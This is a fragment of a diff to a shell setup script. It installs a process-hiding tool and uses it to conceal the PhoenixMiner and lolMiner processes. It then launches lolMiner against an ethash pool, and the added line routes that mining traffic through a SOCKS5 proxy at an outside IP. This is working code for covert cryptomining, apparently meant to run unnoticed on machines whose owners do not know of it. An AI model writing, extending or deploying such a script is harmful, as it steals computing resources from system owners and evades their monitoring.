@@ -9,13 +9,8 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
-sudo swapoff -a; sudo swapon -a
-sleep 10
 ph add PhoenixMinerEth.sh
-Ph add python3
-ph add root
 ph add node-process-hider
 ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY  --timeprint on --longstats 120 
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 120 
 sleep 10
